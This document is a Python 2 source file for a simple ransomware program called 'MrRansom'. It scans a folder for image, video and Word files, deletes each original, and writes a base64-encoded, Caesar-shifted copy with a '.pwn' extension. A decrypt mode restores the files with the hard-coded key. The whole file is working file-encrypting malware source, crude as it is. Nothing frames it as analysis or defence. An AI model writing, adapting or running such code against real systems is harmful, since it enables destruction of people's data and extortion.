import base64
import os

from threading import Thread

from caeser import CaeserCipher


def put_file_bytes(content, file_name):
    out_file = open(file_name, "w")

    print >> out_file, content

    out_file.close()


def get_file_bytes(file_name):
    with open(file_name, "rb") as file_stream:
        file_bytes = file_stream.read()
        file_stream.close()

    return file_bytes


def is_encrypted_file(filename):
    if filename.endswith(".pwn"):
        return True


class MrRansom:

    def __init__(self, root_dir, key):
        self.key = key
        self.root_dir = root_dir
        self.VALID_FILE_TYPES = [".jpg", ".png", ".mp4", ".docx"]
        self.workers = []

    def encrypt(self):
        files = os.listdir(self.root_dir)
        for file_name in files:
            if self.is_valid_file(file_name):
                encrypt_thread = Thread(target=self.encrypt_file, args=(file_name, self.root_dir))
                self.workers.append(encrypt_thread)
                encrypt_thread.start()
        for thread in self.workers:
            thread.join()
            self.workers.remove(thread)

    def decrypt(self):
        files = os.listdir(self.root_dir)
        for file_name in files:
            if is_encrypted_file(file_name):
                decrypt_thread = Thread(target=self.decrypt_file, args=(file_name, self.root_dir))
                self.workers.append(decrypt_thread)
                decrypt_thread.start()
        for thread in self.workers:
            thread.join()
            self.workers.remove(thread)

    def is_valid_file(self, filename):
        for file_type in self.VALID_FILE_TYPES:
            if filename.endswith(file_type) and not filename.startswith("._"):
                return True

    def encrypt_file(self, file_name, root_dir):
        print "Encrypting: {}\n".format(file_name)

        file_bytes = get_file_bytes("{}/{}".format(root_dir, file_name))
        os.remove("{}/{}".format(root_dir, file_name))

        base64_file = base64.b64encode(file_bytes)
        encrypted = CaeserCipher(base64_file, self.key).encrypt()

        put_file_bytes(encrypted, "{}/{}.pwn".format(root_dir, file_name))

    def decrypt_file(self, file_name, root_dir):
        print "Decrypting: {}\n".format(file_name)

        file_bytes = get_file_bytes("{}/{}".format(root_dir, file_name))

        decrypted = CaeserCipher(file_bytes, self.key).decrypt()
        put_file_bytes(base64.b64decode(decrypted), "{}/{}".format(self.root_dir, file_name.replace(".pwn", "")))

        os.remove("{}/{}".format(root_dir, file_name))


if __name__ == '__main__':
    mode = raw_input("Mode [e/d]: ")

    ransom = MrRansom("files", 14)

    if mode == 'e':
        ransom.encrypt()
    elif mode == 'd':
        ransom.decrypt()
    else:
        print "invalid choice"
